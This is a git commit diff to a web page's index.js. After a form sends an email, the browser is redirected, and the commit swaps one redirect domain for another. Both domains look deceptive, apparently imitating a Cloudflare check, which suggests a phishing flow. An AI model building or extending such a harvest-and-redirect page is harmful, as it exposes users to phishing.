380607c8b251f0b42222e70819bcffba92f2df77
husknet <127146284+husknet@users.noreply.github.com>
2024-11-14 15:40:54 +0000

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -54,7 +54,7 @@ export default function Home() {
         });
 
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://sc.ab-flarecheck.pro';
+        window.location.href = 'https://sc.loline-sps.shop';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
